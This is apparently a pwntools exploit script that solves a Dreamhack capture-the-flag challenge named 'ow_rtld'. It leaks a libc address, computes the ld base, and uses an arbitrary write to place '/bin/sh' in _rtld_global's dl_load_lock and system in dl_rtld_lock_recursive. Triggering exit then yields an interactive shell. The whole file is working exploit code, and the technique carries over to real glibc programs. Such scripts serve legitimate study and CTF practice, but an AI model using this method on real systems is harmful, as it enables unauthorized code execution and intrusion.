from pwn import *

p = process('./ow_rtld')
#p = remote('host3.dreamhack.games', 16788)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

# leak addr
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1], 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000

rtld_global = ld_base + ld.symbols['_rtld_global']

dl_load_lock = rtld_global + 2312
dl_recursive = rtld_global + 3840

system = libc_base + libc.symbols['system']

print("libc :", hex(libc_base))
print("ld :", hex(ld_base))
print('dl_load_lock :', hex(dl_load_lock))
print('dl_rtld_lock_recursive :', hex(dl_recursive))
print('system :', hex(system))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())
p.sendlineafter(b'> ', b'2')

p.interactive()